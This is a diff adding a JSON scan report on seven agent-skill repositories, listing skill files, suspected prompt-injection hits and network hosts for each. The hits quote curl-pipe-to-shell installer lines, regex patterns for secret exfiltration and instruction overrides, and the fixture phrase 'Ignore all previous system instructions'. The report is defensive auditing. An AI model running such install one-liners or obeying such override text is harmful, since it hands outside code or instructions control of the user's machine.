@@ -1,0 +1,858 @@
+{
+  "MengTo_Skills": {
+    "git_head": "83a47fee32f0b6349bff1fede99257a5ef03dc93",
+    "recent_commits": [
+      "83a47fe Illustration skills: shins enter the shoe at the collar; feet reach only what the knees allow"
+    ],
+    "last_commit_date": "2026-10-06 22:20:24 +0800",
+    "file_count": 1303,
+    "file_count_capped": false,
+    "skill_md_count": 176,
+    "skill_md_files": [
+      "agent-skills/illustration/illustration-isometric-mono/SKILL.md",
+      "agent-skills/illustration/illustration-ink-sketch/SKILL.md",
+      "agent-skills/illustration/illustration-outlined-cartoon/SKILL.md",
+      "agent-skills/illustration/illustration-line-interior/SKILL.md",
+      "agent-skills/illustration/illustration-halftone-line/SKILL.md",
+      "agent-skills/illustration/illustration-two-colour-brush/SKILL.md",
+      "agent-skills/illustration/illustration-one-line/SKILL.md",
+      "agent-skills/illustration/illustration-flat/SKILL.md",
+      "agent-skills/illustration/illustration-vintage-emblem/SKILL.md",
+      "agent-skills/illustration/illustration-framed-panel/SKILL.md",
+      "agent-skills/illustration/illustration-grainy-gouache/SKILL.md",
+      "agent-skills/illustration/illustration-bold-pop/SKILL.md",
+      "agent-skills/illustration/illustration-flat-with-black/SKILL.md",
+      "agent-skills/illustration/illustration-teal-spot/SKILL.md",
+      "agent-skills/web-design/threejs-weather/SKILL.md",
+      "agent-skills/web-design/dark-glass-clean-layout/SKILL.md",
+      "agent-skills/web-design/mesh-gradient-dark-blue-clean/SKILL.md",
+      "agent-skills/web-design/build-wireframe-scan-reveal/SKILL.md",
+      "agent-skills/web-design/dither-background/SKILL.md",
+      "agent-skills/web-design/bright-green-tech-system-webgl/SKILL.md",
+      "agent-skills/web-design/webgl-landing-steering/SKILL.md",
+      "agent-skills/web-design/tailwindcss/SKILL.md",
+      "agent-skills/web-design/gooey-blob-system/SKILL.md",
+      "agent-skills/web-design/agency-grid-layout-minimal/SKILL.md",
+      "agent-skills/web-design/landing-page/SKILL.md",
+      "agent-skills/web-design/threejs/SKILL.md",
+      "agent-skills/web-design/css-alpha-masking/SKILL.md",
+      "agent-skills/web-design/pointer-trail-emitter/SKILL.md",
+      "agent-skills/web-design/atmosphere-background/SKILL.md",
+      "agent-skills/web-design/build-interactive-particle-trail/SKILL.md",
+      "agent-skills/web-design/cinematic-scroll-storytelling/SKILL.md",
+      "agent-skills/web-design/scroll-world-storytelling/SKILL.md",
+      "agent-skills/web-design/orange-clean-paper-saas/SKILL.md",
+      "agent-skills/web-design/framed-grid-layout/SKILL.md",
+      "agent-skills/web-design/webgl-3d-object/SKILL.md",
+      "agent-skills/web-design/reveal-hover-effect/SKILL.md",
+      "agent-skills/web-design/masked-reveal/SKILL.md",
+      "agent-skills/web-design/cobejs/SKILL.md",
+      "agent-skills/web-design/falling-leaves/SKILL.md",
+      "agent-skills/web-design/editorial-tech/SKILL.md"
+    ],
+    "text_files_scanned": 882,
+    "injection_hits": {
+      "exfiltrate secrets": [
+        {
+          "file": "agent-skills/workflow/workflow-ship-change/scripts/verify-live.sh",
+          "line": 21,
+          "match": "POST, no token"
+        },
+        {
+          "file": "agent-skills/codex/elevenlabs-tts/SKILL.md",
+          "line": 84,
+          "match": "Send the API key as `xi-api-key"
+        }
+      ]
+    },
+    "network_hosts": [
+      "...",
+      "api.elevenlabs.io",
+      "api.iconify.design",
+      "api.simplesvg.com",
+      "api.unisvg.com",
+      "attacker.example",
+      "aura.build",
+      "beam.jakubantalik.com",
+      "bentogrids.com",
+      "cdn.jsdelivr.net",
+      "cdn.tailwindcss.com",
+      "cdnjs.cloudflare.com",
+      "clipster.framer.website",
+      "code.iconify.design",
+      "cta.gallery",
+      "demo-project.supabase.co",
+      "design-system.service.gov.uk",
+      "developer.apple.com",
+      "developer.mozilla.org",
+      "developers.google.com",
+      "docs.x.ai",
+      "drukstudio.framer.website",
+      "evilmartians.com",
+      "ffmpeg.org",
+      "fonts.googleapis.com",
+      "fonts.gstatic.com",
+      "gaspar.framer.website",
+      "getdesign.md",
+      "github.com",
+      "greensock.com",
+      "gsap.com",
+      "hoirqrkdgbmvpwutwuwj.supabase.co",
+      "icon-sets.iconify.design",
+      "images.unsplash.com",
+      "impeccable.style",
+      "intelli.framer.website",
+      "jcgt.org",
+      "m3.material.io",
+      "mengto.github.io",
+      "metal.jakubantalik.com",
+      "mobbin.com",
+      "mths.be",
+      "neuform.ai",
+      "orbs.jakubantalik.com",
+      "owner.github.io",
+      "polyhaven.com",
+      "previews.shaders.com",
+      "raw.githubusercontent.com",
+      "shaders.com",
+      "simpleicons.org",
+      "tailwindcss.com",
+      "threejs.org",
+      "twitter.com",
+      "unicorn.studio",
+      "unpkg.com",
+      "unsplash.com",
+      "verseo.framer.website",
+      "web.dev",
+      "www.aura.build",
+      "www.figma.com"
+    ]
+  },
+  "PracticalSwan_agent-skills": {
+    "git_head": "ff6d12f61e8250dd1b988e101a482f6adc05c451",
+    "recent_commits": [
+      "ff6d12f feat: add humanizer and refresh mapped skills"
+    ],
+    "last_commit_date": "2026-09-14 16:19:00 +0700",
+    "file_count": 2245,
+    "file_count_capped": false,
+    "skill_md_count": 248,
+    "skill_md_files": [
+      "accessibility/SKILL.md",
+      "test-driven-development/SKILL.md",
+      "netlify-ai-gateway/SKILL.md",
+      "trl-training/SKILL.md",
+      "gemini-api-dev/SKILL.md",
+      "php-development/SKILL.md",
+      "skill-installer/SKILL.md",
+      "preservation-verifier/SKILL.md",
+      "jupyter-notebook/SKILL.md",
+      "vercel-cli-with-tokens/SKILL.md",
+      "notion-docs/SKILL.md",
+      "executing-plans/SKILL.md",
+      "vite-development/SKILL.md",
+      "accelerated-computing-cudf/SKILL.md",
+      "figma-generate-diagram/SKILL.md",
+      "huggingface-datasets/SKILL.md",
+      "defense-in-depth/SKILL.md",
+      "rag-eval/SKILL.md",
+      "figma-generate-library/SKILL.md",
+      "figma-create-new-file/SKILL.md",
+      "voice-preserving-rewriter/SKILL.md",
+      "agent-task-mapping/SKILL.md",
+      "netlify-config/SKILL.md",
+      "stitch-loop/SKILL.md",
+      "netlify-functions/SKILL.md",
+      "figma-use-slides/SKILL.md",
+      "netlify-deploy/SKILL.md",
+      "huggingface-vision-trainer/SKILL.md",
+      "huggingface-local-models/SKILL.md",
+      "mongodb-query-optimizer/SKILL.md",
+      "train-sentence-transformers/SKILL.md",
+      "tavily-best-practices/SKILL.md",
+      "docx/SKILL.md",
+      "mongodb-mongoose/SKILL.md",
+      "context-map/SKILL.md",
+      "deepstream-import-vision-model/SKILL.md",
+      "pdf/SKILL.md",
+      "performance/SKILL.md",
+      "tavily-map/SKILL.md",
+      "netlify-frameworks/SKILL.md"
+    ],
+    "text_files_scanned": 1501,
+    "injection_hits": {
+      "exfiltrate secrets": [
+        {
+          "file": "figma-generate-diagram/references/sequence.md",
+          "line": 249,
+          "match": "POST /token"
+        },
+        {
+          "file": "netlify-frameworks/references/nextjs.md",
+          "line": 61,
+          "match": "Send it yourself with `x-deployment-id: process.env"
+        },
+        {
+          "file": "azure-integrations/examples/nextjs-app-service-deployment.md",
+          "line": 122,
+          "match": "upload MongoDB password"
+        },
+        {
+          "file": "security-review/references/vuln-categories.md",
+          "line": 160,
+          "match": "POST/PUT/DELETE) without CSRF token"
+        },
+        {
+          "file": "javascript-development/examples/api-integration-patterns.md",
+          "line": 409,
+          "match": "post('/auth/login', credentials"
+        },
+        {
+          "file": "scripts/skill-registry.json",
+          "line": 1428,
+          "match": "upload safety, credential handling, and token"
+        },
+        {
+          "file": "scripts/import-stitch-skills.py",
+          "line": 166,
+          "match": "upload when API credentials"
+        },
+        {
+          "file": "scripts/import-stitch-skills.py",
+          "line": 168,
+          "match": "upload safety, credential handling, and token"
+        },
+        {
+          "file": "development-workflow/SKILL.md",
+          "line": 98,
+          "match": "send a password"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 46,
+          "match": "send a reset link to the registered email address with a token"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 180,
+          "match": "POST /api/auth/forgot-password"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 329,
+          "match": "POST /api/auth/forgot-password"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 340,
+          "match": "POST /api/auth/reset-password"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 429,
+          "match": "POST /api/auth/forgot-password"
+        },
+        {
+          "file": "development-workflow/examples/feature-spec-example.md",
+          "line": 430,
+          "match": "POST /api/auth/reset-password"
+        },
+        {
+          "file": "security-best-practices/references/python-django-web-server-security.md",
+          "line": 367,
+          "match": "POST to external URLs (Django warns this leaks the token"
+        },
+        {
+          "file": "security-best-practices/references/python-django-web-server-security.md",
+          "line": 369,
+          "match": "send the CSRF token"
+        },
+        {
+          "file": "security-best-practices/references/python-django-web-server-security.md",
+          "line": 376,
+          "match": "POST/PUT/PATCH/DELETE endpoints with session auth and no CSRF tokens"
+        },
+        {
+          "file": "security-best-practices/references/javascript-typescript-nextjs-web-server-security.md",
+          "line": 1067,
+          "match": "POST/PUT/PATCH/DELETE with no token"
+        },
+        {
+          "file": "security-best-practices/references/javascript-express-web-server-security.md",
+          "line": 1069,
+          "match": "POST/PUT/PATCH/DELETE routes using cookie auth with no CSRF tokens"
+        },
+        {
+          "file": "security-best-practices/references/javascript-typescript-react-web-frontend-security.md",
+          "line": 564,
+          "match": "POST', credentials: 'include' })` with no CSRF token"
+        },
+        {
+          "file": "agent-skillguard/rules/default-rules.json",
+          "line": 44,
+          "match": "send|upload|post|forward|exfiltrat\\\\w*)\\\\b[^\\\\n]{0,120}\\\\b(?:secret"
+        },
+        {
+          "file": "agent-skillguard/fixtures/fixture-manifest.json",
+          "line": 8,
+          "match": "upload a credential"
+        },
+        {
+          "file": "x-twitter-scraper/SKILL.md",
+          "line": 189,
+          "match": "send passwords, cookies, session tokens"
+        },
+        {
+          "file": "x-twitter-scraper/references/workflows.md",
+          "line": 7,
+          "match": "send credentials"
+        },
+        {
+          "file": "x-twitter-scraper/references/workflows.md",
+          "line": 478,
+          "match": "webhook, then delete the stored secret"
+        },
+        {
+          "file": "x-twitter-scraper/references/webhooks.md",
+          "line": 82,
+          "match": "webhook secret from POST /webhooks, not an Xquik account credential"
+        },
+        {
+          "file": "x-twitter-scraper/references/webhooks.md",
+          "line": 373,
+          "match": "webhook secret from POST /webhooks, not an Xquik account credential"
+        },
+        {
+          "file": "x-twitter-scraper/references/webhooks.md",
+          "line": 701,
+          "match": "webhook secret from POST /webhooks, not an Xquik account credential"
+        },
+        {
+          "file": "x-twitter-scraper/references/scrape-export-twitter-data.md",
+          "line": 136,
+          "match": "Send it through the `x-api-key"
+        },
+        {
+          "file": "x-twitter-scraper/references/monitor-twitter-webhooks.md",
+          "line": 65,
+          "match": "webhook HMAC secret"
+        }
+      ],
+      "disable safety": [
+        {
+          "file": "netlify-deploy/SKILL.md",
+          "line": 134,
+          "match": "bypass skew protection"
+        },
+        {
+          "file": "deepstream-import-vision-model/scripts/report/mermaid-puppeteer-root.json",
+          "line": 2,
+          "match": "disable-setuid-sandbox"
+        },
+        {
+          "file": "deepstream-import-vision-model/scripts/report/render-mermaid-for-pdf.py",
+          "line": 122,
+          "match": "disable-setuid-sandbox"
+        },
+        {
+          "file": "stitch-extract-static-html/scripts/snapshot.ts",
+          "line": 289,
+          "match": "disable-setuid-sandbox"
+        }
+      ],
+      "curl/wget pipe shell": [
+        {
+          "file": "train-sentence-transformers/references/hf_jobs_execution.md",
+          "line": 9,
+          "match": "curl -LsSf https://hf.co/cli/install.sh | bash"
+        },
+        {
+          "file": "agent-skillguard/fixtures/positive/sg001.md",
+          "line": 1,
+          "match": "curl https://example.invalid/install.sh | sh"
+        }
+      ],
+      "credential file read": [
+        {
+          "file": "security-review/references/secret-patterns.md",
+          "line": 122,
+          "match": "id_rsa"
+        }
+      ],
+      "token literal": [
+        {
+          "file": "security-review/references/secret-patterns.md",
+          "line": 161,
+          "match": "AKIAIOSFODNN7EXAMPLE"
+        }
+      ],
+      "override/ignore instructions": [
+        {
+          "file": "agent-skillguard/rules/default-rules.json",
+          "line": 88,
+          "match": "override)\\\\s+(?:all\\\\s+)?(?:previous|prior|system|developer)\\\\s+instructions"
+        },
+        {
+          "file": "agent-skillguard/fixtures/positive/sg008.md",
+          "line": 1,
+          "match": "Ignore all previous system instructions"
+        }
+      ]
+    },
+    "network_hosts": [
+      "...",
+      "6502.co.uk",
+      "academy.cba.mit.edu",
+      "accounts.example.com",
+      "advisories.gitlab.com",
+      "agentskills.io",
+      "ai.google.dev",
+      "aka.ms",
+      "albumentations.ai",
+      "analytics.example.com",
+      "animals.more-images.com",
+      "apache.org",
+      "api.dicebear.com",
+      "api.example.com",
+      "api.external.com",
+      "api.github.com",
+      "api.githubcopilot.com",
+      "api.jquery.com",
+      "api.mysearch.com",
+      "api.netlify.com",
+      "api.ngc.nvidia.com",
+      "api.openai.com",
+      "apify.com",
+      "app.com",
+      "app.example.com",
+      "app.intigriti.com",
+      "app.netlify.com",
+      "app.tavily.com",
+      "archive.6502.org",
+      "archive.org",
+      "arxiv.org",
+      "aws.github.io",
+      "axios-http.com",
+      "blog.cloudflare.com",
+      "blog.jquery.com",
+      "blurha.sh",
+      "bread80.com",
+      "caniuse.com",
+      "catalog.ngc.nvidia.com",
+      "cc65.github.io",
+      "cdn.example",
+      "cdn.example.com",
+      "cdn.jsdelivr.net",
+      "cdn.sparkfun.com",
+      "cdn.tailwindcss.com",
+      "chainofthought.show",
+      "chat-research.tavily.com",
+      "cheatsheetseries.owasp.org",
+      "claude-skills-deploy.vercel.com",
+      "claude.ai",
+      "clawhub.ai",
+      "cli.github.com",
+      "cli.netlify.com",
+      "cloud.mongodb.com",
+      "code.claude.com",
+      "codeload.github.com",
+      "codex-deploy-skills.vercel.sh",
+      "colab.research.google.com",
+      "conorbronsdon.com",
+      "coolors.co"
+    ]
+  },
+  "divyanshu-iitian_agent-website-design-skills": {
+    "git_head": "77961873e9ee996afe7aa5cd4223b09a2360ed9c",
+    "recent_commits": [
+      "7796187 feat(skills): add agentic web production toolkit"
+    ],
+    "last_commit_date": "2026-08-22 16:03:00 +0530",
+    "file_count": 42,
+    "file_count_capped": false,
+    "skill_md_count": 9,
+    "skill_md_files": [
+      "web-visual-direction/SKILL.md",
+      "responsive-ui-qa/SKILL.md",
+      "conversion-accessibility-polish/SKILL.md",
+      "production-web-architecture/SKILL.md",
+      "web-design-system/SKILL.md",
+      "agentic-site-building/SKILL.md",
+      "product-motion-design/SKILL.md",
+      "landing-page-craft/SKILL.md",
+      "technical-seo-discovery/SKILL.md"
+    ],
+    "text_files_scanned": 39,
+    "injection_hits": "NONE",
+    "network_hosts": [
+      "github.com",
+      "img.shields.io",
+      "raw.githubusercontent.com",
+      "skills.sh"
+    ]
+  },
+  "mblode_agent-skills": {
+    "git_head": "5a781a88ed60c1033767b6b6a966887cd93dd912",
+    "recent_commits": [
+      "5a781a8 Merge pull request #62 from mblode/686-pr-babysitter-follows-a-merged-pr-throug"
+    ],
+    "last_commit_date": "2026-10-09 07:38:02 +1100",
+    "file_count": 554,
+    "file_count_capped": false,
+    "skill_md_count": 28,
+    "skill_md_files": [
+      "skills/presentation-creator/SKILL.md",
+      "skills/ax-audit/SKILL.md",
+      "skills/codebase-architecture/SKILL.md",
+      "skills/pr-creator/SKILL.md",
+      "skills/product-design/SKILL.md",
+      "skills/ui-animation/SKILL.md",
+      "skills/ci-speedup/SKILL.md",
+      "skills/agent-skills-creator/SKILL.md",
+      "skills/multi-tenant-architecture/SKILL.md",
+      "skills/tidy/SKILL.md",
+      "skills/ui-design/SKILL.md",
+      "skills/chat-history/SKILL.md",
+      "skills/ui-verification/SKILL.md",
+      "skills/agent-ready/SKILL.md",
+      "skills/seo/SKILL.md",
+      "skills/test-audit/SKILL.md",
+      "skills/eli5/SKILL.md",
+      "skills/dx-audit/SKILL.md",
+      "skills/agents-md/SKILL.md",
+      "skills/planning/SKILL.md",
+      "skills/scaffold-cli/SKILL.md",
+      "skills/ghostwriter/SKILL.md",
+      "skills/app-verification/SKILL.md",
+      "skills/save-md/SKILL.md",
+      "skills/autoship/SKILL.md",
+      "skills/scaffold-nextjs/SKILL.md",
+      "skills/pr-babysitter/SKILL.md",
+      "skills/typography-audit/SKILL.md"
+    ],
+    "text_files_scanned": 544,
+    "injection_hits": {
+      "disable safety": [
+        {
+          "file": "skills/tidy/references/security-checklist.md",
+          "line": 49,
+          "match": "Disable security"
+        }
+      ],
+      "exfiltrate secrets": [
+        {
+          "file": "skills/ui-design/guidelines/buttons.md",
+          "line": 12,
+          "match": "upload file, generate password"
+        },
+        {
+          "file": "skills/scaffold-nextjs/references/app-setup.md",
+          "line": 284,
+          "match": "upload wrapper that throws when its credentials"
+        }
+      ],
+      "credential file read": [
+        {
+          "file": "skills/dx-audit/rules/cli-agent-input-hardening.md",
+          "line": 15,
+          "match": "id_rsa"
+        }
+      ]
+    },
+    "network_hosts": [
+      "acme.app",
+      "agentskills.io",
+      "agentsurface.dev",
+      "ahrefs.com",
+      "ai-sdk.dev",
+      "api.buildkite.com",
+      "api.example.com",
+      "api.firecrawl.dev",
+      "api.fontshare.com",
+      "app.example.test",
+      "app.example.test.",
+      "arethetypeswrong.github.io",
+      "arxiv.org",
+      "assets.ui.sh",
+      "blode.co",
+      "blog.arcjet.com",
+      "blog.modelcontextprotocol.io",
+      "blogs.bing.com",
+      "buildkite.com",
+      "claude.dev",
+      "cli.github.com",
+      "clig.dev",
+      "code.claude.com",
+      "count.example.test.",
+      "designplusai.com",
+      "developer.chrome.com",
+      "developer.mozilla.org",
+      "developers.cloudflare.com",
+      "developers.google.com",
+      "developers.openai.com",
+      "docs.acme.com",
+      "docs.ag-ui.com",
+      "docs.example.com",
+      "docs.google.com",
+      "docs.npmjs.com",
+      "docs.stripe.com",
+      "drive.google.com",
+      "drive.usercontent.google.com",
+      "easing.dev",
+      "easings.co",
+      "en.wikipedia.org",
+      "fixel.macpaw.com",
+      "fonts.google.com",
+      "garbas.si",
+      "gist.github.com",
+      "github.com",
+      "google.aip.dev",
+      "hacker-news.firebaseio.com",
+      "img.shields.io",
+      "interfaces.rauno.me",
+      "is-agentic.com",
+      "isitagentready.com",
+      "llmstxt.org",
+      "logoipsum.com",
+      "modelcontextprotocol.io",
+      "mytool.dev",
+      "neon.com",
+      "nextjs.org",
+      "nodejs.org",
+      "openai.com"
+    ]
+  },
+  "overseek944_frontend-ui-ux-skill": {
+    "git_head": "fa25478d1f50f5dbd4f8119a03524fb14bb4277e",
+    "recent_commits": [
+      "fa25478 Add frontend-ui-ux skill: evidence-based UI/UX and frontend engineering doctrine"
+    ],
+    "last_commit_date": "2026-08-02 19:02:24 +0530",
+    "file_count": 8,
+    "file_count_capped": false,
+    "skill_md_count": 1,
+    "skill_md_files": [
+      "SKILL.md"
+    ],
+    "text_files_scanned": 7,
+    "injection_hits": "NONE",
+    "network_hosts": [
+      "baymard.com",
+      "dl.acm.org",
+      "docs.claude.com",
+      "github.com",
+      "lawsofux.com",
+      "web.dev",
+      "www.nngroup.com"
+    ]
+  },
+  "thekorn_agent-skills": {
+    "git_head": "92e22ef4214449e86af2241cfa2abd6cc0b76c92",
+    "recent_commits": [
+      "92e22ef feat(skills): add Burda brand system HTML skills"
+    ],
+    "last_commit_date": "2026-09-10 17:18:35 +0200",
+    "file_count": 152,
+    "file_count_capped": false,
+    "skill_md_count": 22,
+    "skill_md_files": [
+      "skills/herdr/SKILL.md",
+      "skills/gitlab-workflow/SKILL.md",
+      "skills/stitch-loop/SKILL.md",
+      "skills/web-browser/SKILL.md",
+      "skills/html/SKILL.md",
+      "skills/github-workflow/SKILL.md",
+      "skills/ctf-sandbox-status/SKILL.md",
+      "skills/gh-cli/SKILL.md",
+      "skills/burda-html/SKILL.md",
+      "skills/burda-html-plan/SKILL.md",
+      "skills/design-md/SKILL.md",
+      "skills/glab/SKILL.md",
+      "skills/sqlite3-cli/SKILL.md",
+      "skills/commit/SKILL.md",
+      "skills/hunk-review/SKILL.md",
+      "skills/html-diagram/SKILL.md",
+      "skills/grill-me/SKILL.md",
+      "skills/frontend-design/SKILL.md",
+      "skills/burda-html-diagram/SKILL.md",
+      "skills/bun-development/SKILL.md",
+      "skills/html-plan/SKILL.md",
+      "skills/grilling/SKILL.md"
+    ],
+    "text_files_scanned": 139,
+    "injection_hits": {
+      "exfiltrate secrets": [
+        {
+          "file": "skills/ctf-sandbox-status/SKILL.md",
+          "line": 66,
+          "match": "send `ctfTestsBypass: super-secret"
+        }
+      ],
+      "credential file read": [
+        {
+          "file": "skills/gh-cli/SKILL.md",
+          "line": 656,
+          "match": "id_rsa"
+        },
+        {
+          "file": "skills/gh-cli/SKILL.md",
+          "line": 1730,
+          "match": "id_rsa"
+        },
+        {
+          "file": "skills/gh-cli/SKILL.md",
+          "line": 1749,
+          "match": "id_rsa"
+        },
+        {
+          "file": "skills/glab/references/commands-detailed.md",
+          "line": 520,
+          "match": "id_rsa"
+        },
+        {
+          "file": "skills/glab/references/commands-detailed.md",
+          "line": 523,
+          "match": "id_rsa"
+        }
+      ],
+      "curl/wget pipe shell": [
+        {
+          "file": "skills/bun-development/SKILL.md",
+          "line": 33,
+          "match": "curl -fsSL https://bun.sh/install | bash"
+        },
+        {
+          "file": "skills/bun-development/SKILL.md",
+          "line": 591,
+          "match": "curl -fsSL https://bun.sh/install | bash"
+        }
+      ]
+    },
+    "network_hosts": [
+      "...",
+      "acme.app",
+      "agentskills.io",
+      "bun.sh",
+      "cli.github.com",
+      "docs.claude.com",
+      "docs.github.com",
+      "docs.gitlab.com",
+      "elysiajs.com",
+      "github.com",
+      "gitlab.com",
+      "jira.example.com",
+      "keepachangelog.com",
+      "registry.npmjs.org",
+      "registry.npmmirror.com",
+      "semver.org",
+      "status.gitlab.com",
+      "stitch.withgoogle.com",
+      "thariqs.github.io",
+      "www.contributor-covenant.org"
+    ]
+  },
+  "vercel-labs_open-agents": {
+    "git_head": "cf865e94de7729751c747171785b6ce57e7b178c",
+    "recent_commits": [
+      "cf865e9 Migrate package management to PNPM (#889)"
+    ],
+    "last_commit_date": "2026-06-04 10:48:13 +0200",
+    "file_count": 777,
+    "file_count_capped": false,
+    "skill_md_count": 13,
+    "skill_md_files": [
+      ".agents/skills/chat-sdk/SKILL.md",
+      ".agents/skills/emil-design-eng/SKILL.md",
+      ".agents/skills/agent-browser/SKILL.md",
+      ".agents/skills/web-animation-design/SKILL.md",
+      ".agents/skills/plan-mode/SKILL.md",
+      ".agents/skills/ai-sdk/SKILL.md",
+      ".agents/skills/code-review/SKILL.md",
+      ".agents/skills/baseline-ui/SKILL.md",
+      ".agents/skills/workflow/SKILL.md",
+      ".agents/skills/frontend-design/SKILL.md",
+      ".agents/skills/remove-demo-limits/SKILL.md",
+      ".agents/skills/vercel-react-best-practices/SKILL.md",
+      ".agents/skills/deploy-open-harness/SKILL.md"
+    ],
+    "text_files_scanned": 528,
+    "injection_hits": {
+      "exfiltrate secrets": [
+        {
+          "file": ".agents/skills/deploy-open-harness/SKILL.md",
+          "line": 142,
+          "match": "webhook secret"
+        }
+      ],
+      "credential file read": [
+        {
+          "file": "packages/agent/tools/bash.ts",
+          "line": 46,
+          "match": "id_rsa"
+        }
+      ]
+    },
+    "network_hosts": [
+      "0.0.0.0",
+      "10.0.0.1",
+      "169.254.169.254",
+      "172.16.0.1",
+      "192.168.0.1",
+      "93.184.216.34",
+      "ai-gateway.vercel.sh",
+      "ai-sdk.dev",
+      "api.example.com",
+      "api.github.com",
+      "api.vercel.com",
+      "app.com",
+      "app.example.com",
+      "asia-proxy.example.com",
+      "attacker.example",
+      "base-ui.com",
+      "corpproxy.company.com",
+      "csstriggers.com",
+      "custom.api",
+      "docs.example.com",
+      "easing.dev",
+      "easings.co",
+      "eu-proxy.example.com",
+      "external-vendor.com",
+      "external.com",
+      "gist.github.com",
+      "github.com",
+      "httpbin.org",
+      "internal.company.com",
+      "internal.example",
+      "intranet.company.com",
+      "jsfiddle.net",
+      "json.schemastore.org",
+      "models.dev",
+      "myapp.com",
+      "nextjs.org",
+      "open-agents.dev",
+      "open-agents.invalid",
+      "openharness.dev",
+      "preview-new.example.com",
+      "preview-old.example.com",
+      "preview-openharness.vercel.app",
+      "preview.example.com",
+      "project-preview.vercel.app",
+      "protected.example.com",
+      "proxy.com",
+      "proxy.example.com",
+      "proxy1.example.com",
+      "proxy2.example.com",
+      "proxy3.example.com",
+      "react.dev",
+      "sb-",
+      "sb-3000.vercel.run",
+      "sb-8000.vercel.run",
+      "sbx-",
+      "sbx-3000.vercel.run",
+      "sbx-80.vercel.run",
+      "site.com",
+      "site1.com",
+      "site2.com"
+    ]
+  }
+}
